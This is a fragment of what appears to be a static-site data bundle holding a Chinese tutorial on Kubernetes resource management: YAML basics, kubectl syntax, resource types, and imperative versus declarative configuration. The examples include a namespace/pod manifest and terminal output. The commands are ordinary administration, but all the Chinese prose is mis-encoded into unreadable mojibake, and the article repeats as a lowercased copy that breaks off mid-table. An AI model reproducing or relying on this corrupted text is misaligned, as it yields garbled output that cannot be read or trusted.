}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nä»èæ¬ä¸­å¯ä»¥çåºï¼æä»¬éè¦ä¸ä¸ª branch åæ°ï¼è¿è¦éç½® åç«¯é¡¹ç®ç è¿ç¨ server å°å\n\n> è¿éæ²¡æä½¿ç¨ execcommand çå½ä»¤ï¼èæ¯éè¿ sourcefilesãremoveprefixãremotedirectoryï¼sourcefiles ä»£è¡¨æä»¬ copy åªä¸ªæä»¶ï¼remotedirectory è¿ç¨ç®å½ï¼ç¹å°±æ¯ copy å° nginx æå¨ç®å½\n> 57-62',charsets:{cjk:!0}},{title:"kubernetes(ä¸) èµæºç®¡ç",frontmatter:{title:"kubernetes(ä¸) èµæºç®¡ç",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/602",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/602.kubernetes(%E4%B8%89)%20%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86.html",relativePath:"01.è¿ç»´/60.Kubernetes/602.kubernetes(ä¸) èµæºç®¡ç.md",key:"v-734bf71d",path:"/kubernetes/602/",headers:[{level:2,title:"èµæºç®¡çä»ç»",slug:"èµæºç®¡çä»ç»",normalizedTitle:"èµæºç®¡çä»ç»",charIndex:2},{level:2,title:"YAMLè¯­è¨ä»ç»",slug:"yamlè¯­è¨ä»ç»",normalizedTitle:"yaml è¯­è¨ä»ç»",charIndex:448},{level:2,title:"èµæºç®¡çæ¹å¼",slug:"èµæºç®¡çæ¹å¼",normalizedTitle:"èµæºç®¡çæ¹å¼",charIndex:1715},{level:3,title:"å½ä»¤å¼å¯¹è±¡ç®¡ç",slug:"å½ä»¤å¼å¯¹è±¡ç®¡ç",normalizedTitle:"å½ä»¤å¼å¯¹è±¡ç®¡ç",charIndex:1726},{level:4,title:"kubectlå½ä»¤",slug:"kubectlå½ä»¤",normalizedTitle:"kubectl å½ä»¤",charIndex:2174},{level:4,title:"èµæºç±»å",slug:"èµæºç±»å",normalizedTitle:"èµæºç±»å",charIndex:2368},{level:4,title:"æä½",slug:"æä½",normalizedTitle:"æä½",charIndex:43},{level:3,title:"å½ä»¤å¼å¯¹è±¡éç½®",slug:"å½ä»¤å¼å¯¹è±¡éç½®",normalizedTitle:"å½ä»¤å¼å¯¹è±¡éç½®",charIndex:1817},{level:3,title:"å£°æå¼å¯¹è±¡éç½®",slug:"å£°æå¼å¯¹è±¡éç½®",normalizedTitle:"å£°æå¼å¯¹è±¡éç½®",charIndex:1899}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"èµæºç®¡çä»ç» YAMLè¯­è¨ä»ç» èµæºç®¡çæ¹å¼ å½ä»¤å¼å¯¹è±¡ç®¡ç kubectlå½ä»¤ èµæºç±»å æä½ å½ä»¤å¼å¯¹è±¡éç½® å£°æå¼å¯¹è±¡éç½®",content:'# èµæºç®¡çä»ç»\n\nå¨ kubernetes ä¸­ï¼ææçåå®¹é½æ½è±¡ä¸ºèµæºï¼ç¨æ·éè¦éè¿æä½èµæºæ¥ç®¡ç kubernetesã\n\n> kubernetes çæ¬è´¨ä¸å°±æ¯ä¸ä¸ªéç¾¤ç³»ç»ï¼ç¨æ·å¯ä»¥å¨éç¾¤ä¸­é¨ç½²åç§æå¡ï¼æè°çé¨ç½²æå¡ï¼å¶å®å°±æ¯å¨ kubernetes éç¾¤ä¸­è¿è¡ä¸ä¸ªä¸ªçå®¹å¨ï¼å¹¶å°æå®çç¨åºè·å¨å®¹å¨ä¸­ã\n> \n> kubernetes çæå°ç®¡çååæ¯ pod èä¸æ¯å®¹å¨ï¼æä»¥åªè½å°å®¹å¨æ¾å¨ Pod ä¸­ï¼è kubernetes ä¸è¬ä¹ä¸ä¼ç´æ¥ç®¡ç Podï¼èæ¯éè¿ Podæ§å¶å¨ æ¥ç®¡ç Pod çã\n> \n> Pod å¯ä»¥æä¾æå¡ä¹åï¼å°±è¦èèå¦ä½è®¿é® Pod ä¸­æå¡ï¼kubernetes æä¾äº Service èµæºå®ç°è¿ä¸ªåè½ã\n> \n> å½ç¶ï¼å¦æ Pod ä¸­ç¨åºçæ°æ®éè¦æä¹åï¼kubernetes è¿æä¾äºåç§ å­å¨ ç³»ç»ã\n\n\n\n> å­¦ä¹  kubernetes çæ ¸å¿ï¼å°±æ¯å­¦ä¹ å¦ä½å¯¹éç¾¤ä¸ç PodãPodæ§å¶å¨ãServiceãå­å¨ ç­åç§èµæºè¿è¡æä½\n\n\n# YAML è¯­è¨ä»ç»\n\nYAML æ¯ä¸ä¸ªç±»ä¼¼ XMLãJSON çæ è®°æ§è¯­è¨ãå®å¼ºè°ä»¥æ°æ®ä¸ºä¸­å¿ï¼å¹¶ä¸æ¯ä»¥æ è¯è¯­è¨ä¸ºéç¹ãå è YAML æ¬èº«çå®ä¹æ¯è¾ç®åï¼å·ç§° "ä¸ç§äººæ§åçæ°æ®æ ¼å¼è¯­è¨"ã\n\n# xml è¯­æ³ æ htmlè¯­æ³\n<heima>\n    <age>15</age>\n    <address>Beijing</address>\n</heima>\n\n\n1\n2\n3\n4\n5\n\n\n# yaml è¯­æ³\nheima:\n  age: 15\n  address: Beijing\n\n\n1\n2\n3\n4\n\n\nYAML çè¯­æ³æ¯è¾ç®åï¼ä¸»è¦æä¸é¢å ä¸ªï¼\n\n * å¤§å°åææ\n * ä½¿ç¨ç¼©è¿è¡¨ç¤ºå±çº§å³ç³»\n * ç¼©è¿ä¸åè®¸ä½¿ç¨ tabï¼åªåè®¸ç©ºæ ¼ (ä½çæ¬éå¶)\n * ç¼©è¿çç©ºæ ¼æ°ä¸éè¦ï¼åªè¦ç¸åå±çº§çåç´ å·¦å¯¹é½å³å¯\n * \'#\' è¡¨ç¤ºæ³¨é\n\nYAML æ¯æä»¥ä¸å ç§æ°æ®ç±»åï¼\n\n * çº¯éï¼åä¸ªçãä¸å¯ååçå¼\n * å¯¹è±¡ï¼é®å¼å¯¹çéåï¼åç§°ä¸ºæ å°ï¼mappingï¼/ åå¸ï¼hashï¼ / å­å¸ï¼dictionaryï¼\n * æ°ç»ï¼ä¸ç»ææ¬¡åºæåçå¼ï¼åç§°ä¸ºåºåï¼sequenceï¼ / åè¡¨ï¼listï¼\n\n# çº¯é, å°±æ¯æçä¸ä¸ªç®åçå¼ï¼å­ç¬¦ä¸²ãå¸å°å¼ãæ´æ°ãæµ®ç¹æ°ãNullãæ¶é´ãæ¥æ\n# 1 å¸å°ç±»å\nc1: true (æèTrue)\n# 2 æ´å\nc2: 234\n# 3 æµ®ç¹å\nc3: 3.14\n# 4 nullç±»å \nc4: ~  # ä½¿ç¨~è¡¨ç¤ºnull\n# 5 æ¥æç±»å\nc5: 2018-02-17    # æ¥æå¿é¡»ä½¿ç¨ISO 8601æ ¼å¼ï¼å³yyyy-MM-dd\n# 6 æ¶é´ç±»å\nc6: 2018-02-17T15:02:31+08:00  # æ¶é´ä½¿ç¨ISO 8601æ ¼å¼ï¼æ¶é´åæ¥æä¹é´ä½¿ç¨Tè¿æ¥ï¼æåä½¿ç¨+ä»£è¡¨æ¶åº\n# 7 å­ç¬¦ä¸²ç±»å\nc7: heima     # ç®ååæ³ï¼ç´æ¥åå¼ , å¦æå­ç¬¦ä¸²ä¸­é´æç¹æ®å­ç¬¦ï¼å¿é¡»ä½¿ç¨åå¼å·æèåå¼å·åè£¹ \nc8: line1\n    line2     # å­ç¬¦ä¸²è¿å¤çæåµå¯ä»¥ææå¤è¡ï¼æ¯ä¸è¡ä¼è¢«è½¬åæä¸ä¸ªç©ºæ ¼\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# å¯¹è±¡\n# å½¢å¼ä¸(æ¨è):\nheima:\n  age: 15\n  address: Beijing\n# å½¢å¼äº(äºè§£):\nheima: {age: 15,address: Beijing}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# æ°ç»\n# å½¢å¼ä¸(æ¨è):\naddress:\n  - é¡ºä¹\n  - æå¹³  \n# å½¢å¼äº(äºè§£):\naddress: [é¡ºä¹,æå¹³]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> å°æç¤ºï¼\n> 1 ä¹¦å yaml åè®° : åé¢è¦å ä¸ä¸ªç©ºæ ¼\n> 2 å¦æéè¦å°å¤æ®µ yaml éç½®æ¾å¨ä¸ä¸ªæä»¶ä¸­ï¼ä¸­é´è¦ä½¿ç¨ --- åé\n> 3 ä¸é¢æ¯ä¸ä¸ª yaml è½¬ json çç½ç«ï¼å¯ä»¥éè¿å®éªè¯ yaml æ¯å¦ä¹¦åæ­£ç¡®\n\n\n# èµæºç®¡çæ¹å¼\n\n * å½ä»¤å¼å¯¹è±¡ç®¡çï¼ç´æ¥ä½¿ç¨å½ä»¤å»æä½ kubernetes èµæº\n   kubectl run nginx-pod --image=nginx:1.17.1 --port=80\n * å½ä»¤å¼å¯¹è±¡éç½®ï¼éè¿å½ä»¤éç½®åéç½®æä»¶å»æä½ kubernetes èµæº\n   kubectl create/patch -f nginx-pod.yaml\n * å£°æå¼å¯¹è±¡éç½®ï¼éè¿ apply å½ä»¤åéç½®æä»¶å»æä½ kubernetes èµæº\n   kubectl apply -f nginx-pod.yaml\n\nç±»å        æä½å¯¹è±¡   éç¨ç¯å¢   ä¼ç¹        ç¼ºç¹\nå½ä»¤å¼å¯¹è±¡ç®¡ç   å¯¹è±¡     æµè¯     ç®å        åªè½æä½æ´»å¨å¯¹è±¡ï¼æ æ³å®¡è®¡ãè·è¸ª\nå½ä»¤å¼å¯¹è±¡éç½®   æä»¶     å¼å     å¯ä»¥å®¡è®¡ãè·è¸ª   é¡¹ç®å¤§æ¶ï¼éç½®æä»¶å¤ï¼æä½éº»ç¦\nå£°æå¼å¯¹è±¡éç½®   ç®å½     å¼å     æ¯æç®å½æä½    æå¤æåµä¸é¾ä»¥è°è¯\n\n\n# å½ä»¤å¼å¯¹è±¡ç®¡ç\n\n# kubectl å½ä»¤\n\nkubectl æ¯ kubernetes éç¾¤çå½ä»¤è¡å·¥å·ï¼éè¿å®è½å¤å¯¹éç¾¤æ¬èº«è¿è¡ç®¡çï¼å¹¶è½å¤å¨éç¾¤ä¸è¿è¡å®¹å¨ååºç¨çå®è£é¨ç½²ãkubectl å½ä»¤çè¯­æ³å¦ä¸ï¼\n\nkubectl [command] [type] [name] [flags]\n\n\n1\n\n * commandï¼æå®è¦å¯¹èµæºæ§è¡çæä½ï¼ä¾å¦ createãgetãdelete\n * typeï¼æå®èµæºç±»åï¼æ¯å¦ deploymentãpodãservice\n * nameï¼æå®èµæºçåç§°ï¼åç§°å¤§å°åææ\n * flagsï¼æå®é¢å¤çå¯éåæ°\n\n# æ¥çææpod\nkubectl get pod \n\n# æ¥çæä¸ªpod\nkubectl get pod pod_name\n\n# æ¥çæä¸ªpod,ä»¥yamlæ ¼å¼å±ç¤ºç»æ\nkubectl get pod pod_name -o yaml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# èµæºç±»å\n\nkubernetes ä¸­ææçåå®¹é½æ½è±¡ä¸ºèµæºï¼å¯ä»¥éè¿ä¸é¢çå½ä»¤è¿è¡æ¥ç:\n\nkubectl api-resources\n\n\n1\n\n\nç»å¸¸ä½¿ç¨çèµæºæä¸é¢è¿äºï¼\n\nèµæºåç±»         èµæºåç§°                       ç¼©å       èµæºä½ç¨\néç¾¤çº§å«èµæº       nodes                      no       éç¾¤ç»æé¨å\nnamespaces   ns                         éç¦» Pod   \npod èµæº       pods                       po       è£è½½å®¹å¨\npod èµæºæ§å¶å¨    replicationcontrollers     rc       æ§å¶ pod èµæº\n             replicasets                rs       æ§å¶ pod èµæº\n             deployments                deploy   æ§å¶ pod èµæº\n             daemonsets                 ds       æ§å¶ pod èµæº\n             jobs                                æ§å¶ pod èµæº\n             cronjobs                   cj       æ§å¶ pod èµæº\n             horizontalpodautoscalers   hpa      æ§å¶ pod èµæº\n             statefulsets               sts      æ§å¶ pod èµæº\næå¡åç°èµæº       services                   svc      ç»ä¸ pod å¯¹å¤æ¥å£\n             ingress                    ing      ç»ä¸ pod å¯¹å¤æ¥å£\nå­å¨èµæº         volumeattachments                   å­å¨\n             persistentvolumes          pv       å­å¨\n             persistentvolumeclaims     pvc      å­å¨\néç½®èµæº         configmaps                 cm       éç½®\n             secrets                             éç½®\n\n# æä½\n\nkubernetes åè®¸å¯¹èµæºè¿è¡å¤ç§æä½ï¼å¯ä»¥éè¿ --help æ¥çè¯¦ç»çæä½å½ä»¤\n\nkubectl --help\n\n\n1\n\n\nç»å¸¸ä½¿ç¨çæä½æä¸é¢è¿äºï¼\n\nå½ä»¤åç±»    å½ä»¤             ç¿»è¯                 å½ä»¤ä½ç¨\nåºæ¬å½ä»¤    create         åå»º                 åå»ºä¸ä¸ªèµæº\n        edit           ç¼è¾                 ç¼è¾ä¸ä¸ªèµæº\n        get            è·å                 è·åä¸ä¸ªèµæº\n        patch          æ´æ°                 æ´æ°ä¸ä¸ªèµæº\n        delete         å é¤                 å é¤ä¸ä¸ªèµæº\n        explain        è§£é                 å±ç¤ºèµæºææ¡£\nè¿è¡åè°è¯   run            è¿è¡                 å¨éç¾¤ä¸­è¿è¡ä¸ä¸ªæå®çéå\n        expose         æ´é²                 æ´é²èµæºä¸º Service\n        describe       æè¿°                 æ¾ç¤ºèµæºåé¨ä¿¡æ¯\n        logs           æ¥å¿è¾åºå®¹å¨å¨ pod ä¸­çæ¥å¿   è¾åºå®¹å¨å¨ pod ä¸­çæ¥å¿\n        attach         ç¼ ç»è¿å¥è¿è¡ä¸­çå®¹å¨         è¿å¥è¿è¡ä¸­çå®¹å¨\n        exec           æ§è¡å®¹å¨ä¸­çä¸ä¸ªå½ä»¤         æ§è¡å®¹å¨ä¸­çä¸ä¸ªå½ä»¤\n        cp             å¤å¶                 å¨ Pod åå¤å¤å¶æä»¶\n        rollout        é¦æ¬¡å±ç¤º               ç®¡çèµæºçåå¸\n        scale          è§æ¨¡                 æ© (ç¼©) å®¹ Pod çæ°é\n        autoscale      èªå¨è°æ´               èªå¨è°æ´ Pod çæ°é\né«çº§å½ä»¤    apply          rc                 éè¿æä»¶å¯¹èµæºè¿è¡éç½®\n        label          æ ç­¾                 æ´æ°èµæºä¸çæ ç­¾\nå¶ä»å½ä»¤    cluster-info   éç¾¤ä¿¡æ¯               æ¾ç¤ºéç¾¤ä¿¡æ¯\n        version        çæ¬                 æ¾ç¤ºå½å Server å Client ççæ¬\n\nä¸é¢ä»¥ä¸ä¸ª namespace /pod çåå»ºåå é¤ç®åæ¼ç¤ºä¸å½ä»¤çä½¿ç¨ï¼\n\n# åå»ºä¸ä¸ªnamespace\n[root@master ~]# kubectl create namespace dev\nnamespace/dev created\n\n# è·ånamespace\n[root@master ~]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   21h\ndev               Active   21s\nkube-node-lease   Active   21h\nkube-public       Active   21h\nkube-system       Active   21h\n\n# å¨æ­¤namespaceä¸åå»ºå¹¶è¿è¡ä¸ä¸ªnginxçPod\n[root@master ~]# kubectl run pod --image=nginx:latest -n dev\nkubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead.\ndeployment.apps/pod created\n\n# æ¥çæ°åå»ºçpod\n[root@master ~]# kubectl get pod -n dev\nNAME  READY   STATUS    RESTARTS   AGE\npod   1/1     Running   0          21s\n\n# å é¤æå®çpod\n[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x\npod "pod" deleted\n\n# å é¤æå®çnamespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# å½ä»¤å¼å¯¹è±¡éç½®\n\nå½ä»¤å¼å¯¹è±¡éç½®å°±æ¯ä½¿ç¨å½ä»¤éåéç½®æä»¶ä¸èµ·æ¥æä½ kubernetes èµæºã\n1ï¼ åå»ºä¸ä¸ª nginxpod.yamlï¼åå®¹å¦ä¸ï¼\n\n# çæ¬\napiVersion: v1\n# ç±»å\nkind: Namespace\n# åæ°æ®\nmetadata:\n  # åç§°\n  name: dev\n\n---\n\napiVersion: v1\nkind: Pod\nmetadata:\n  # åç§°\n  name: nginxpod\n  # æå¨å½åç©ºé´\n  namespace: dev\n# è¯¦ç»æè¿°\nspec:\n  containers:\n  # å®¹å¨çåå­\n  - name: nginx-containers\n    # å®¹å¨æç¨çéå\n    image: nginx:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n2ï¼æ§è¡ create å½ä»¤ï¼åå»ºèµæºï¼\n\n[root@master ~]# kubectl create -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n\n1\n2\n3\n\n\næ­¤æ¶åç°åå»ºäºä¸¤ä¸ªèµæºå¯¹è±¡ï¼åå«æ¯ namespace å pod\n\n3ï¼æ§è¡ get å½ä»¤ï¼æ¥çèµæºï¼\n\n[root@master ~]#  kubectl get -f nginxpod.yaml\nNAME            STATUS   AGE\nnamespace/dev   Active   18s\n\nNAME            READY   STATUS    RESTARTS   AGE\npod/nginxpod    1/1     Running   0          17s\n\n\n1\n2\n3\n4\n5\n6\n\n\nè¿æ ·å°±æ¾ç¤ºäºä¸¤ä¸ªèµæºå¯¹è±¡çä¿¡æ¯\n\n4ï¼æ§è¡ delete å½ä»¤ï¼å é¤èµæºï¼\n\n[root@master ~]# kubectl delete -f nginxpod.yaml\nnamespace "dev" deleted\npod "nginxpod" deleted\n\n\n1\n2\n3\n\n\næ­¤æ¶åç°ä¸¤ä¸ªèµæºå¯¹è±¡è¢«å é¤äº\n\næ»ç»:\n    å½ä»¤å¼å¯¹è±¡éç½®çæ¹å¼æä½èµæºï¼å¯ä»¥ç®åçè®¤ä¸ºï¼å½ä»¤  +  yamléç½®æä»¶ï¼éé¢æ¯å½ä»¤éè¦çåç§åæ°ï¼\n\n\n1\n2\n\n\n\n# å£°æå¼å¯¹è±¡éç½®\n\nå£°æå¼å¯¹è±¡éç½®è·å½ä»¤å¼å¯¹è±¡éç½®å¾ç¸ä¼¼ï¼ä½æ¯å®åªæä¸ä¸ªå½ä»¤ applyã\n\n# é¦åæ§è¡ä¸æ¬¡kubectl apply -f yamlæä»¶ï¼åç°åå»ºäºèµæº\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n# åæ¬¡æ§è¡ä¸æ¬¡kubectl apply -f yamlæä»¶ï¼åç°è¯´èµæºæ²¡æåå¨\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev unchanged\npod/nginxpod unchanged\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ»ç»:\n    å¶å®å£°æå¼å¯¹è±¡éç½®å°±æ¯ä½¿ç¨applyæè¿°ä¸ä¸ªèµæºæç»çç¶æï¼å¨yamlä¸­å®ä¹ç¶æï¼\n    ä½¿ç¨applyæä½èµæºï¼\n        å¦æèµæºä¸å­å¨ï¼å°±åå»ºï¼ç¸å½äº kubectl create\n        å¦æèµæºå·²å­å¨ï¼å°±æ´æ°ï¼ç¸å½äº kubectl patch\n\n\n1\n2\n3\n4\n5\n\n\n> æ©å±ï¼kubectl å¯ä»¥å¨ node èç¹ä¸è¿è¡åï¼\n\nkubectl çè¿è¡æ¯éè¦è¿è¡éç½®çï¼å®çéç½®æä»¶æ¯ $HOME/.kubeï¼å¦ææ³è¦å¨ node èç¹è¿è¡æ­¤å½ä»¤ï¼éè¦å° master ä¸ç.kube æä»¶å¤å¶å° node èç¹ä¸ï¼å³å¨ master èç¹ä¸æ§è¡ä¸é¢æä½ï¼\n\nscp  -r  ~/.kube   node102:~/\n\n\n1\n\n\n> ä½¿ç¨æ¨èï¼ä¸ç§æ¹å¼åºè¯¥æä¹ç¨ï¼\n> åå»º / æ´æ°èµæº ä½¿ç¨å£°æå¼å¯¹è±¡éç½® kubectl apply -f XXX.yaml\n> å é¤èµæº ä½¿ç¨å½ä»¤å¼å¯¹è±¡éç½® kubectl delete -f XXX.yaml\n> æ¥è¯¢èµæº ä½¿ç¨å½ä»¤å¼å¯¹è±¡ç®¡ç kubectl get (describe) èµæºåç§°',normalizedContent:'# èµæºç®¡çä»ç»\n\nå¨ kubernetes ä¸­ï¼ææçåå®¹é½æ½è±¡ä¸ºèµæºï¼ç¨æ·éè¦éè¿æä½èµæºæ¥ç®¡ç kubernetesã\n\n> kubernetes çæ¬è´¨ä¸å°±æ¯ä¸ä¸ªéç¾¤ç³»ç»ï¼ç¨æ·å¯ä»¥å¨éç¾¤ä¸­é¨ç½²åç§æå¡ï¼æè°çé¨ç½²æå¡ï¼å¶å®å°±æ¯å¨ kubernetes éç¾¤ä¸­è¿è¡ä¸ä¸ªä¸ªçå®¹å¨ï¼å¹¶å°æå®çç¨åºè·å¨å®¹å¨ä¸­ã\n> \n> kubernetes çæå°ç®¡çååæ¯ pod èä¸æ¯å®¹å¨ï¼æä»¥åªè½å°å®¹å¨æ¾å¨ pod ä¸­ï¼è kubernetes ä¸è¬ä¹ä¸ä¼ç´æ¥ç®¡ç podï¼èæ¯éè¿ podæ§å¶å¨ æ¥ç®¡ç pod çã\n> \n> pod å¯ä»¥æä¾æå¡ä¹åï¼å°±è¦èèå¦ä½è®¿é® pod ä¸­æå¡ï¼kubernetes æä¾äº service èµæºå®ç°è¿ä¸ªåè½ã\n> \n> å½ç¶ï¼å¦æ pod ä¸­ç¨åºçæ°æ®éè¦æä¹åï¼kubernetes è¿æä¾äºåç§ å­å¨ ç³»ç»ã\n\n\n\n> å­¦ä¹  kubernetes çæ ¸å¿ï¼å°±æ¯å­¦ä¹ å¦ä½å¯¹éç¾¤ä¸ç podãpodæ§å¶å¨ãserviceãå­å¨ ç­åç§èµæºè¿è¡æä½\n\n\n# yaml è¯­è¨ä»ç»\n\nyaml æ¯ä¸ä¸ªç±»ä¼¼ xmlãjson çæ è®°æ§è¯­è¨ãå®å¼ºè°ä»¥æ°æ®ä¸ºä¸­å¿ï¼å¹¶ä¸æ¯ä»¥æ è¯è¯­è¨ä¸ºéç¹ãå è yaml æ¬èº«çå®ä¹æ¯è¾ç®åï¼å·ç§° "ä¸ç§äººæ§åçæ°æ®æ ¼å¼è¯­è¨"ã\n\n# xml è¯­æ³ æ htmlè¯­æ³\n<heima>\n    <age>15</age>\n    <address>beijing</address>\n</heima>\n\n\n1\n2\n3\n4\n5\n\n\n# yaml è¯­æ³\nheima:\n  age: 15\n  address: beijing\n\n\n1\n2\n3\n4\n\n\nyaml çè¯­æ³æ¯è¾ç®åï¼ä¸»è¦æä¸é¢å ä¸ªï¼\n\n * å¤§å°åææ\n * ä½¿ç¨ç¼©è¿è¡¨ç¤ºå±çº§å³ç³»\n * ç¼©è¿ä¸åè®¸ä½¿ç¨ tabï¼åªåè®¸ç©ºæ ¼ (ä½çæ¬éå¶)\n * ç¼©è¿çç©ºæ ¼æ°ä¸éè¦ï¼åªè¦ç¸åå±çº§çåç´ å·¦å¯¹é½å³å¯\n * \'#\' è¡¨ç¤ºæ³¨é\n\nyaml æ¯æä»¥ä¸å ç§æ°æ®ç±»åï¼\n\n * çº¯éï¼åä¸ªçãä¸å¯ååçå¼\n * å¯¹è±¡ï¼é®å¼å¯¹çéåï¼åç§°ä¸ºæ å°ï¼mappingï¼/ åå¸ï¼hashï¼ / å­å¸ï¼dictionaryï¼\n * æ°ç»ï¼ä¸ç»ææ¬¡åºæåçå¼ï¼åç§°ä¸ºåºåï¼sequenceï¼ / åè¡¨ï¼listï¼\n\n# çº¯é, å°±æ¯æçä¸ä¸ªç®åçå¼ï¼å­ç¬¦ä¸²ãå¸å°å¼ãæ´æ°ãæµ®ç¹æ°ãnullãæ¶é´ãæ¥æ\n# 1 å¸å°ç±»å\nc1: true (æètrue)\n# 2 æ´å\nc2: 234\n# 3 æµ®ç¹å\nc3: 3.14\n# 4 nullç±»å \nc4: ~  # ä½¿ç¨~è¡¨ç¤ºnull\n# 5 æ¥æç±»å\nc5: 2018-02-17    # æ¥æå¿é¡»ä½¿ç¨iso 8601æ ¼å¼ï¼å³yyyy-mm-dd\n# 6 æ¶é´ç±»å\nc6: 2018-02-17t15:02:31+08:00  # æ¶é´ä½¿ç¨iso 8601æ ¼å¼ï¼æ¶é´åæ¥æä¹é´ä½¿ç¨tè¿æ¥ï¼æåä½¿ç¨+ä»£è¡¨æ¶åº\n# 7 å­ç¬¦ä¸²ç±»å\nc7: heima     # ç®ååæ³ï¼ç´æ¥åå¼ , å¦æå­ç¬¦ä¸²ä¸­é´æç¹æ®å­ç¬¦ï¼å¿é¡»ä½¿ç¨åå¼å·æèåå¼å·åè£¹ \nc8: line1\n    line2     # å­ç¬¦ä¸²è¿å¤çæåµå¯ä»¥ææå¤è¡ï¼æ¯ä¸è¡ä¼è¢«è½¬åæä¸ä¸ªç©ºæ ¼\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# å¯¹è±¡\n# å½¢å¼ä¸(æ¨è):\nheima:\n  age: 15\n  address: beijing\n# å½¢å¼äº(äºè§£):\nheima: {age: 15,address: beijing}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# æ°ç»\n# å½¢å¼ä¸(æ¨è):\naddress:\n  - é¡ºä¹\n  - æå¹³  \n# å½¢å¼äº(äºè§£):\naddress: [é¡ºä¹,æå¹³]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> å°æç¤ºï¼\n> 1 ä¹¦å yaml åè®° : åé¢è¦å ä¸ä¸ªç©ºæ ¼\n> 2 å¦æéè¦å°å¤æ®µ yaml éç½®æ¾å¨ä¸ä¸ªæä»¶ä¸­ï¼ä¸­é´è¦ä½¿ç¨ --- åé\n> 3 ä¸é¢æ¯ä¸ä¸ª yaml è½¬ json çç½ç«ï¼å¯ä»¥éè¿å®éªè¯ yaml æ¯å¦ä¹¦åæ­£ç¡®\n\n\n# èµæºç®¡çæ¹å¼\n\n * å½ä»¤å¼å¯¹è±¡ç®¡çï¼ç´æ¥ä½¿ç¨å½ä»¤å»æä½ kubernetes èµæº\n   kubectl run nginx-pod --image=nginx:1.17.1 --port=80\n * å½ä»¤å¼å¯¹è±¡éç½®ï¼éè¿å½ä»¤éç½®åéç½®æä»¶å»æä½ kubernetes èµæº\n   kubectl create/patch -f nginx-pod.yaml\n * å£°æå¼å¯¹è±¡éç½®ï¼éè¿ apply å½ä»¤åéç½®æä»¶å»æä½ kubernetes èµæº\n   kubectl apply -f nginx-pod.yaml\n\nç±»å        æä½å¯¹è±¡   éç¨ç¯å¢   ä¼ç¹        ç¼ºç¹\nå½ä»¤å¼å¯¹è±¡ç®¡ç   å¯¹è±¡     æµè¯     ç®å        åªè½æä½æ´»å¨å¯¹è±¡ï¼æ æ³å®¡è®¡ãè·è¸ª\nå½ä»¤å¼å¯¹è±¡éç½®   æä»¶     å¼å     å¯ä»¥å®¡è®¡ãè·è¸ª   é¡¹ç®å¤§æ¶ï¼éç½®æä»¶å¤ï¼æä½éº»ç¦\nå£°æå¼å¯¹è±¡éç½®   ç®å½     å¼å     æ¯æç®å½æä½    æå¤æåµä¸é¾ä»¥è°è¯\n\n\n# å½ä»¤å¼å¯¹è±¡ç®¡ç\n\n# kubectl å½ä»¤\n\nkubectl æ¯ kubernetes éç¾¤çå½ä»¤è¡å·¥å·ï¼éè¿å®è½å¤å¯¹éç¾¤æ¬èº«è¿è¡ç®¡çï¼å¹¶è½å¤å¨éç¾¤ä¸è¿è¡å®¹å¨ååºç¨çå®è£é¨ç½²ãkubectl å½ä»¤çè¯­æ³å¦ä¸ï¼\n\nkubectl [command] [type] [name] [flags]\n\n\n1\n\n * commandï¼æå®è¦å¯¹èµæºæ§è¡çæä½ï¼ä¾å¦ createãgetãdelete\n * typeï¼æå®èµæºç±»åï¼æ¯å¦ deploymentãpodãservice\n * nameï¼æå®èµæºçåç§°ï¼åç§°å¤§å°åææ\n * flagsï¼æå®é¢å¤çå¯éåæ°\n\n# æ¥çææpod\nkubectl get pod \n\n# æ¥çæä¸ªpod\nkubectl get pod pod_name\n\n# æ¥çæä¸ªpod,ä»¥yamlæ ¼å¼å±ç¤ºç»æ\nkubectl get pod pod_name -o yaml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# èµæºç±»å\n\nkubernetes ä¸­ææçåå®¹é½æ½è±¡ä¸ºèµæºï¼å¯ä»¥éè¿ä¸é¢çå½ä»¤è¿è¡æ¥ç:\n\nkubectl api-resources\n\n\n1\n\n\nç»å¸¸ä½¿ç¨çèµæºæä¸é¢è¿äºï¼\n\nèµæºåç±»         èµæºåç§°                       ç¼©å       èµæºä½ç¨\néç¾¤çº§å«èµæº       nodes                      no       éç¾¤ç»æé¨å\nnamespaces   ns                         éç¦» pod   \npod èµæº       pods                       po       è£è½½å®¹å¨\npod èµæºæ§å¶å¨    replicationcontrollers     rc       æ§å¶ pod èµæº\n             replicasets                rs       æ§å¶ pod èµæº\n             deployments                deploy   æ§å¶ pod èµæº\n             daemonsets                 ds       æ§å¶ pod èµæº\n             jobs                                æ§å¶ pod èµæº\n             cronjobs                   cj       æ§å¶ pod èµæº\n             horizontalpodautoscalers   hpa      æ§å¶ pod èµæº\n             statefulsets               sts      æ§å¶ pod 